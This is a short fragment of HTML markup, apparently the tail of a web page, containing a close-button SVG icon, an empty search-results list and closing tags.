        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto overflow-auto px-2">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
